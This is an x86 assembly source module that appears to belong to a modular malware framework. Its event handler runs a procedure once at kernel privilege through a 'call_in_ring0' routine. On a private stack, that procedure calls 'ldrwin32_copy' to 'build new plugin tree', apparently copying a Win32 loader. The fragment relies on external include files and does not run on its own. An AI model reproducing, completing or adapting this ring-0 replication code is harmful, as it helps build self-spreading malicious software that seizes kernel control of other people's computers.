
include                 R0COPY.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\LDRWIN32\ldrwin32.inc
include                 ..\PLAN\plan.inc

                        extrn   malloc:PROC
                        extrn   mfree:PROC

                        extrn   Event:PROC
                        public  HandleEvent

R0_STACK_SIZE           equ     65536

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

ring0_complete          db      0

save_esp                dd      ?
stk_handle              dd      ?

                        .code


HandleEvent:            mov     eax, [esp+4]

                        cmp     eax, EV_PLAN_PER_MACHINE
                        je      __go_r0
                        cmp     eax, EV_PLAN_PER_SESSION
                        je      __go_r0

__return_0:             xor     eax, eax
                        retn

__go_r0:                cmp     ring0_complete, 0
                        jne     __return_0
                        inc     ring0_complete
                        
                        push    offset r0proc
                        callW   call_in_ring0
                        add     esp, 4

                        mov     eax, 1
                        retn

r0proc:
;                       push    0
;                       push    EV_R0COPY_ONSTART
;                       callW   Event
;                       add     esp, 8

                        push    R0_STACK_SIZE
                        call    malloc
                        mov     stk_handle, eax

                        mov     save_esp, esp
                        lea     esp, [eax + R0_STACK_SIZE]

                        push    EV_R0COPY_IDLE
                        callW   ldrwin32_copy ; build new plugin tree
                        add     esp, 4        ;   & call specified event

                        mov     esp, save_esp

                        push    stk_handle
                        call    mfree

                        retn

                        end
